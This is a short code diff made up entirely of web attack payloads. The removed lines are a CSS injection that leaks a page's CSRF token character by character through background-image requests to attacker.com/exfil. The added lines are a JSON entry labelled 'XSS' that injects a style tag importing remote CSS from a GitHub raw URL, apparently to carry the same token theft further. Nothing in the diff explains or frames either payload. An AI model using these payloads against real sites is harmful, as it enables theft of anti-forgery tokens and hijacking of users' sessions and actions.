@@ -1,9 +1,3 @@
-input[name=csrf][value^=a]{
-    background-image: url(https://attacker.com/exfil/a);
-}
-input[name=csrf][value^=b]{
-    background-image: url(https://attacker.com/exfil/b);
-}
-input[name=csrf][value^=9]{
-    background-image: url(https://attacker.com/exfil/9);
+{
+  "XSS": "<style>@import url(https://raw.githubusercontent.com/HongJiWook/ex01/master/swagger.json/staging?len=32);</style>"
 }
